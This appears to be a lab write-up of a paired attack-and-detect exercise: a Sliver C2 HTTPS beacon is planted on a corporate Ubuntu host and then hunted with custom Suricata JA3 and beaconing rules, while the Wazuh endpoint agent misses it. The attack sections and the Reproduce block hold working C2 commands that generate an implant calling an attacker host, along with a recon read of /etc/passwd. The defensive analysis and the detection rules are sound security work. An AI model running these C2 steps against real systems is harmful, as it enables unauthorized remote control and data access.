# Attack / Detect: Sliver C2 — beacon on a CORP host, hunted on the wire

**Phase 5 — Offense in context (C2 / adversary emulation).** A paired attacker-console / defender-alert
walkthrough of a full command-and-control operation: stand up a [Sliver](https://github.com/BishopFox/sliver)
C2 server on `atk-01`, land an HTTPS **beacon** on a CORP host, run post-exploitation over the channel, then
hunt it two ways — **network** (Suricata NSM on `rtr-01`) and **endpoint** (Wazuh agent on the victim). The
most important thing this exercise teaches is *where each sensor sees the C2 and where it goes blind*, and it
ends with two custom Suricata detections written **as code** and **verified firing** against the live beacon.

Attacker: `atk-01` (Kali, REDTEAM, `10.10.40.119`) · C2: Sliver v1.7.6 · Victim: `fs-01` (Ubuntu file
server, CORP, `10.10.10.20`, Wazuh agent 004) · SIEM: `siem-01` · NSM: Suricata 7.0.10 inline on `rtr-01`'s
CORP interface (`enp26s0`).

> [!check] Executed and verified live on 2026-08-29.
> Beacon `8c330850` checked in from `fs-01` over HTTPS and ran post-ex recon; **both** custom Suricata rules
> fired on the live traffic (sid 9100001 JA3 implant fingerprint — 24 alerts; sid 9100002 beaconing — 80
> alerts), while the ET Open ruleset produced **no** C2 signature and the Wazuh endpoint agent produced
> **zero** C2 alerts. Every number below came out of the running lab, not a diagram.

---

## 1. The scenario, and why it's shaped this way

A real intrusion rarely ends at initial access — the operator drops an implant that **beacons out** to
attacker infrastructure and tasks it over that channel. Modelling that here forced two deliberate design
decisions:

- **The victim is on CORP, not DMZ.** The NSM sensor (Suricata + Zeek) is inline on `rtr-01`'s **CORP**
  interface. A beacon from a DMZ host to REDTEAM would never cross the monitored link, so the network-
  detection half of the exercise would be a no-op. `fs-01` (CORP) puts the C2 traffic squarely through the
  sensor.
- **Egress is modelled, not faked.** A beacon calls *home*, so the victim's segment must reach the C2. The
  lab's default-deny firewall has no `CORP → REDTEAM` rule (only the attacker reaching *in*). Rather than
  punch a hole blindly, one tightly-scoped rule was added and documented — `CORP → REDTEAM:{80,443}` — which
  models exactly the reality a real C2 abuses: **a corporate firewall almost always permits outbound web, and
  the implant rides it** (T1071.001). REDTEAM stands in for attacker-controlled internet infrastructure. The
  rule lives in `roles/router/files/nftables.conf` (IaC-tracked, reversible) and routes the C2 through the
  CORP interface where the sensor can see it.

```
   fs-01 (CORP 10.10.10.20)  ──HTTPS beacon, 5s──▶  atk-01 (REDTEAM 10.10.40.119:443)
        [Wazuh agent 004]            │                        [Sliver C2 server]
                                     ▼
                          rtr-01 CORP iface enp26s0
                          [Suricata inline NSM]  ◀── this is where it gets caught
```

---

## 2. Attack — executed from atk-01

### 2a. C2 infrastructure
Sliver installed on the attacker box (it has WAN egress — realistic attacker infra, unlike the internal-only
CORP hosts). The server runs as a systemd daemon; the console is driven over its gRPC operator connection.

```
sliver > https --lport 443
[*] Starting HTTPS :443 listener ...
[*] Successfully started job #1
```

### 2b. Generate + deliver the beacon (T1105 — Ingress Tool Transfer)
```
sliver > generate beacon --http https://10.10.40.119:443 --os linux --arch arm64 \
             --seconds 5 --jitter 3 --name corpbeacon --save /tmp/corpbeacon
[*] Generating new linux/arm64 beacon implant binary (5s)
[*] Build completed in 1m11s — Implant saved to /tmp/corpbeacon
```
A **beacon** (periodic check-in) is chosen over an interactive session precisely because the regular call-home
cadence is the behaviour the blue team will hunt. The 33 MB linux/arm64 implant is staged to `fs-01:/tmp/` and
executed as the ordinary user `tohudgins` (a realistic initial-access context — no root needed to beacon).

### 2c. Check-in (T1071.001 — Application Layer Protocol: Web)
```
sliver > beacons
 ID         Name        Transport   Hostname   Username    OS            Last Check-In
 8c330850   corpbeacon  http(s)     fs-01      tohudgins   linux/arm64   2s
```

### 2d. Post-exploitation over the channel (T1033/T1082/T1016 — Discovery)
Recon tasked to the beacon with `execute` (each spawns a process on `fs-01`, results returned over C2):
```
sliver (corpbeacon) > execute -o -- whoami        →  tohudgins
sliver (corpbeacon) > execute -o -- id
sliver (corpbeacon) > execute -o -- uname -a
sliver (corpbeacon) > execute -o -- cat /etc/passwd
sliver (corpbeacon) > execute -o -- ip addr       →  inet 10.10.10.20/24 ... enp2s0
[+] corpbeacon completed task 2c4b6781
```

---

## 3. Detect — network (Suricata NSM on rtr-01)

### 3a. What the stock ruleset saw: not the C2
The ET Open ruleset produced **no** C2 signature for the Sliver channel. Filtering `eve.json` for the C2 host
returned only generic TCP-stream anomalies (`SURICATA STREAM ESTABLISHED packet out of window`, …) — noise
from the many short beacon connections, not a detection. **Why:** the C2 is **TLS 1.3**, so the certificate is
encrypted inside the handshake — Suricata logs `tls.subject: None`. Cert- and content-based signatures have
nothing to match. This is the honest, important result: *encrypted C2 on 443 walks past a signature IDS.*

### 3b. What Suricata *did* capture: TLS metadata
Even without decrypting, Suricata fingerprints the handshake. Every beacon flow to `10.10.40.119:443` logged a
**stable** pair:
- **JA3 (client / implant):** `725543c78edf669194c11dc7a039b56e`
- **JA3S (server / listener):** `f4febc55ea12b31ae17cfb7e614afda8`

Both are Go `crypto/tls` fingerprints (Sliver is written in Go). They are shared by other Go TLS software, so
they're used *scoped* — as one signal, paired with the destination and the beaconing behaviour, never alone.

### 3c. Custom detections, written as code and verified (`roles/router/files/suricata-local.rules`)
Two rules, two independent angles — the Suricata companion to the Wazuh `local_rules.xml`:

```
# (1) implant TLS fingerprint — CLIENT ja3, matched in the to_server direction
alert tls $HOME_NET any -> 10.10.40.0/24 443 (msg:"LAB SLIVER C2 HTTPS beacon - Go-TLS JA3 implant fp to REDTEAM (T1071.001)";
    flow:established,to_server; ja3.hash; content:"725543c78edf669194c11dc7a039b56e"; classtype:trojan-activity; sid:9100001; rev:2;)

# (2) beaconing behaviour — repeated short connections, encryption-agnostic
alert tcp $HOME_NET any -> 10.10.40.0/24 443 (msg:"LAB C2 beaconing - repeated conns to REDTEAM:443 (T1071)";
    flags:S; detection_filter:track by_src, count 10, seconds 60; classtype:trojan-activity; sid:9100002; rev:1;)
```

**Verified firing on the live beacon:** sid 9100001 → 24 alerts, sid 9100002 → 80 alerts, all
`10.10.10.20 → 10.10.40.119:443`.

Two real gotchas were solved getting rule (1) to fire — both worth keeping:
- **JA3S vs JA3 direction.** The first draft matched **ja3s** (the *server* fingerprint). It never fired.
  JA3S lives in the **ServerHello (to_client)**, but a `... -> dest 443` rule is evaluated **to_server**, so
  the ja3s buffer is never inspected. The **client** ja3 is in the ClientHello (to_server) and matches the
  same rule direction — so rule (1) fingerprints the *implant*, which is arguably the better IOC anyway.
- **`ja3-fingerprints: auto` → `yes`.** In `auto` mode Suricata computed ja3 for eve *logging* but left the
  ja3 **detection** buffer unpopulated, so a ja3 rule silently never matched. Set explicitly to `yes`
  (`roles/router/tasks/main.yml`).

Rule (2), the **beaconing** rule, is the more robust of the two: it keys on the *pattern* (≥10 check-ins/min
to one REDTEAM host on 443), so it survives a TLS-fingerprint rotation that would defeat rule (1).

---

## 4. Detect — endpoint (Wazuh agent on fs-01): the blind spot

Querying the Wazuh manager's alert log for `fs-01` across the whole operation returned **zero** alerts related
to the beacon or its recon — only benign background noise (dpkg events, `sshd` logins from the operator,
rootcheck, AppArmor). The endpoint agent was **blind** to the C2, for concrete reasons:
- The implant landed in `/tmp`, which has **no FIM** watch (the lab's FIM is on `/srv/samba/public`).
- The beacon runs **in-memory**; its `execute` recon spawns processes, but `fs-01` has **no auditd execve
  rules**, so Wazuh's default Linux ruleset logs none of them.
- Nothing touched a monitored path, an auth boundary, or a known-bad indicator.

This is not a Wazuh failure — it's the expected behaviour of a default host agent against a well-behaved
implant, and it is exactly why the exercise matters.

---

## 5. The takeaway

**A TLS-1.3 C2 beacon slipped past both a signature IDS *and* a default endpoint agent — and was still caught,
by behavioural network monitoring.** Encryption blinded the content inspector; in-memory execution and
un-instrumented `/tmp`/execve blinded the host agent; but the *shape* of the traffic — a CORP host phoning a
REDTEAM host on 443 every five seconds — is not something encryption can hide, and a five-line behavioural
rule catches it deterministically. That is the defense-in-depth thesis made concrete, and it mirrors the
Phase 6 NSM finding (a signature IDS went blind on encrypted DCSync while Zeek's protocol parser named the
operation): **run host and network sensors together, because they fail on different traffic.**

**Honest gaps / next steps** (deliberately left as follow-ups, not hidden):
- **Close the endpoint blind spot** — add auditd execve monitoring (or Sysmon-for-Linux) on `fs-01` and a
  Wazuh rule for anonymous binaries executing from `/tmp` + beacon-like child processes, then re-run and
  verify the endpoint side lights up too.
- **Zeek** was not logging reliably after a fresh boot this session (Suricata was the working NSM layer); its
  `conn.log`/`ssl.log` would add a cleaner beaconing-interval view and belongs in a redeploy pass.

---

## Reproduce

```bash
# --- attacker: Sliver on atk-01 (driven through tmux — the console is a readline TUI
#     that silently drops piped/expect input; tmux send-keys uses a real PTY) ---
ssh atk-01 'sudo tmux new-session -d -s c2 /usr/local/bin/sliver-client'   # then: capture-pane / send-keys
#   https --lport 443
#   generate beacon --http https://10.10.40.119:443 --os linux --arch arm64 --seconds 5 --jitter 3 --save /tmp/corpbeacon
# deliver /tmp/corpbeacon to fs-01, run it, then: beacons / use <id> / execute -o -- <cmd>

# --- defender: confirm the custom rules fired ---
ssh rtr-01 "grep -aoE '\"signature_id\":910000[12]' /var/log/suricata/eve.json | sort | uniq -c"

# --- defender: confirm the endpoint saw nothing C2-related ---
ssh siem-01 "sudo grep -a '\"name\":\"fs-01\"' /var/ossec/logs/alerts/alerts.json | tail -200"
```
Detections deployed by the `router` Ansible role (`roles/router/{files/suricata-local.rules,tasks/main.yml}`);
the egress model is in `roles/router/files/nftables.conf`.
